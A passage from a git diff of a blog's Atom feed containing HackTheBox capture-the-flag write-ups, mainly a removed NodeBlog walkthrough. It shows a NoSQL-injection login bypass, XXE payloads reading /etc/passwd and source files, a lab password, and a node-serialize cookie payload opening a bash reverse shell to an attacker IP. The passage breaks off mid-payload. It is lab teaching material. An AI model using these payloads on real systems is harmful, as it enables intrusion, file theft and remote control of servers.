class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;127.0.0.1:1337&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+  </entry>
+  
+  <entry>
     <title>HackTheBox: PhantomFeed</title>
     
     <link href="http://localhost:4000/ctfs/htb-phantomfeed/"/>
@@ -4878,7 +5264,6 @@ hr {
         &lt;span class=&quot;n&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;jwt_tokn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
             &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
 
     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
@@ -5255,839 +5640,6 @@ lxml
 &lt;ol&gt;
   &lt;li&gt;&lt;strong&gt;Prioritize Query Parameterization Over Filters:&lt;/strong&gt; Security controls should never rely on string formatting (like f-strings) for query construction. Whether writing SQL, NoSQL, or XPath, always use built-in variable binding mechanisms to keep the data plane separated from the control plane.&lt;/li&gt;
   &lt;li&gt;&lt;strong&gt;Account for Environment Limitations:&lt;/strong&gt; Development dependencies dictate available functionality. Knowing that Python’s default XML utilities stick to XPath 1.0 highlights the importance of mastering core string manipulation formulas (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substring&lt;/code&gt;) to simulate modern query logic during testing or exploitation.&lt;/li&gt;
-&lt;/ol&gt;
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: NodeBlog</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-nodeblog/"/>
-    <updated>2026-06-29T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-nodeblog/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;h1 id=&quot;-nodeblog&quot;&gt;🎯 NodeBlog&lt;/h1&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;strong&gt;OS:&lt;/strong&gt; Linux&lt;/td&gt;
-      &lt;td&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Easy&lt;/td&gt;
-      &lt;td&gt;&lt;strong&gt;IP:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.129.96.160&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-htb.png&quot; alt=&quot;nodeblog.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;️-tldr--attack-chain&quot;&gt;⛓️ TL;DR / Attack Chain&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;strong&gt;Foothold:&lt;/strong&gt; A NoSQL injection bypass on the login page grants access to the admin session. Within the admin panel, an XML upload feature is vulnerable to XXE, allowing arbitrary file reading to grab the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server.js&lt;/code&gt; source code. The source code reveals an unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node-serialize&lt;/code&gt; implementation processing the auth cookie, which is exploited to achieve Remote Code Execution (RCE) and a reverse shell.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;PrivEsc:&lt;/strong&gt; Local enumeration reveals MongoDB running locally without authentication. Querying the database exposes the admin cleartext password (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IppsecSaysPleaseSubscribe&lt;/code&gt;). This credential enables full &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; privileges for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; user, allowing easy access to the root flag.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-loot--creds&quot;&gt;🔑 Loot &amp;amp; Creds&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;User&lt;/th&gt;
-      &lt;th&gt;Credential&lt;/th&gt;
-      &lt;th&gt;Where / How&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IppsecSaysPleaseSubscribe&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;Found in the local MongoDB &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog&lt;/code&gt; database within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users&lt;/code&gt; collection.&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-0-setup--global-variables&quot;&gt;🔧 0. Setup &amp;amp; Global Variables&lt;/h2&gt;
-&lt;p&gt;&lt;em&gt;Run this in your terminal once so you can copy-paste the rest of the commands blindly.&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.129.96.160&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DOMAIN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nodeblog.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-1-enumeration&quot;&gt;🔍 1. Enumeration&lt;/h2&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; nmap &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; ./nmap/nmap
-Starting Nmap 7.99 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2026-06-29 12:32 +0200
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nodeblog.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.96.160&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.032s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey:
-|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-5000/tcp open  http    Node.js &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Express middleware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Blog
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;34.25 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;http5000&quot;&gt;HTTP/5000&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-1.png&quot; alt=&quot;nodeblog-1.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Login page at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://nodeblog.htb:5000/login&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-2.png&quot; alt=&quot;nodeblog-2.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Trying to authenticate as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asdf&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asdf&lt;/code&gt; gives us &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid Username&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-3.png&quot; alt=&quot;nodeblog-3.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Trying to authenticate as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; gives us &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid Password&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-4.png&quot; alt=&quot;nodeblog-4.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Easy to bruteforce then. I believe.&lt;/p&gt;
-
-&lt;p&gt;SQL injections seem to have no affect on the webapp. We can try NoSQL injection tho. Send request and capture with burpsuite:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-5.png&quot; alt=&quot;nodeblog-5.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;It worked. Looking at the raw response we see this:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Set-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So let’s set our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth&lt;/code&gt; cookie to that value in the browser:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-6.png&quot; alt=&quot;nodeblog-6.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;New buttons appear so it must have worked. We are admin now!&lt;/p&gt;
-
-&lt;p&gt;There’s an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload&lt;/code&gt; button. When uploading a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;png&lt;/code&gt; it says &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid XML Example: Example DescriptionExample Markdown&lt;/code&gt;. So let’s upload a page XML file including an XXE payload:&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE data [
-&amp;lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;&lt;/span&gt;
-]&amp;gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;post&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;kekw&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;kekw&lt;span class=&quot;nt&quot;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;markdown&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;file;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/markdown&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-7.png&quot; alt=&quot;nodeblog-7.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;It worked. Easy.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-2-initial-foothold&quot;&gt;🚪 2. Initial Foothold&lt;/h2&gt;
-
-&lt;p&gt;Let’s look for some source code now:&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE data [
-&amp;lt;!ENTITY file SYSTEM &quot;file:///opt/blog/server.js&quot;&amp;gt;&lt;/span&gt;
-]&amp;gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;post&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;kekw&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;kekw&lt;span class=&quot;nt&quot;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;markdown&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;file;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/markdown&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-8.png&quot; alt=&quot;nodeblog-8.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We find this function:&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;undefined&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;
-
-    &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sign&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;createHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie_secret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;It unserializes our own provided cookie which we can easily exploit (especialRoot/SYSTEMly as we have a valid cookie and the secrets to build a custom one).&lt;/p&gt;
-
-&lt;p&gt;Let’s build the payload first:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.127/1337 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 0
-L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyNy8xMzM3IDA+JjEK
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;lookatme&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_$$ND_FUNC$$_function (){ require(&apos;child_process&apos;).exec(&apos;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyNy8xMzM3IDA+JjEK|base64 -d|bash&apos;,function(error, stdout, stderr) { console.log(stdout) }); }()&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Urlencode:&lt;/p&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lookatme&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ND_FUNC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;child_process&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyNy8xMzM3IDA%2BJjEK%7Cbase64%20-d%7Cbash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span 